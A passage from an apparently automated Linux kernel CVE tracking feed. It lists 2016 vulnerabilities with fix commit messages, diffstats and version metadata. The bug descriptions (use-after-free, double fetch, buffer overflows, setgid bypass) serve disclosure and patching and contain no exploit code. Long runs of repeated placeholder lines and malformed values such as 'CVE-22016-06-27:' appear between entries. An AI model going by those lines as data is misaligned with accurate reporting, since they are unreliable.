    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
